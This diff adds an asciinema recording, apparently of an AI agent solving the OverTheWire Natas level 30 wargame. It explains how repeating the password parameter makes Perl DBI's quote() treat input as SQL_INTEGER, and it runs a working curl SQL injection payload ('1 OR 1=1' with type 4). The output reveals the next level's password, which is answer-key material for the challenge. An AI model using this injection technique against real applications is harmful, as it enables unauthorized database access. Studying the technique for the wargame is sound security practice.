@@ -1,0 +1,8 @@
+{"version":3,"term":{"cols":100,"rows":32},"timestamp":1793521924,"idle_time_limit":2.0,"command":"bash /home/claude/solves/natas/L30.sh","title":"Natas L30 -> natas31: DBI quote() type argument - repeated password[] turns it into SQL_INTEGER","env":{"SHELL":"/bin/bash"}}
+[0.002, "o", "$ curl -s -u natas30:<pw> http://natas30.natas.labs.overthewire.org/index-source.html\r\n$   source: my $query=\"Select * FROM users where username =\".$dbh->quote(param(\"username\"))\r\n$           . \" and password =\".$dbh->quote(param(\"password\"));\r\n"]
+[0.600, "o", "    my $query=\"Select * FROM users where username =\".$dbh->quote(param('username')) . \" and password =\".$dbh->quote(param('password')); \r\n    my $sth = $dbh->prepare($query);\r\n    $sth->execute();\r\n    my $ver = $sth->fetch();\r\n$ the query is built with DBI->quote(), so quotes are escaped: no SQLi with a string.\r\n$ BUT: CGI gives an ARRAY when the parameter is repeated, and DBI quote() takes a\r\n$   second argument: the SQL type. If we send password twice, param() returns a\r\n$   list, and the second value becomes that type argument.\r\n$   DBI type 4 is SQL_INTEGER: quote() then treats our string as a NUMBER and\r\n$   does not quote it -> the injected SQL survives.\r\n$ curl -s -u natas30:<pw> -d 'username=natas31' -d 'password=1 OR 1=1' -d 'password=4' http://natas30.natas.labs.overthewire.org/index.pl\r\n"]
+[0.443, "o", "win!here is your result:natas31aQzrirxwd2Wiaoq8HnSjcc8IUWlxdd1zView sourcecode\r\n"]
+[0.001, "o", "$ control: single password (string, escaped):\r\n"]
+[0.439, "o", "fail :(View sourcecode\r\n"]
+[0.000, "o", "$ verify: curl -u natas31:<pw> http://natas31.natas.labs.overthewire.org/ -> 200\r\n"]
+[0.001, "x", "0"]
